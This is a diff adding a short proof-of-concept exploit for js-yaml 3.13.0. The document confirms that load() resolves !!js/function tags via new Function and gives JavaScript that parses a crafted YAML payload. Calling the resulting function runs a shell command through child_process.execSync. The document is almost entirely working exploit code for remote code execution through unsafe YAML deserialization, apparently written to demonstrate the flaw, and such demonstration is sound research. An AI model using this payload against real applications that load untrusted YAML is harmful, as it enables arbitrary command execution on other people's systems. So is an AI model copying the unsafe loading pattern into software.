@@ -1,0 +1,18 @@
+Confirmed: js-yaml 3.13.0's `load()` uses the full schema, which resolves `!!js/function` tags into `new Function(...)`, allowing arbitrary code execution when parsing untrusted YAML.
+
+```javascript
+const yaml = require("js-yaml");
+
+// Malicious YAML payload using the !!js/function tag,
+// resolved via new Function(...) by js-yaml's default (unsafe) full schema loader.
+const maliciousYaml = `
+exploit: !<tag:yaml.org,2002:js/function> "function () { return require('child_process').execSync('id').toString(); }"
+`;
+
+const doc = yaml.load(maliciousYaml);
+
+// The YAML value is now a real, callable JS function constructed via new Function().
+console.log("Type of parsed value:", typeof doc.exploit);
+console.log("Executing parsed function -> command injection PoC output:");
+console.log(doc.exploit());
+```
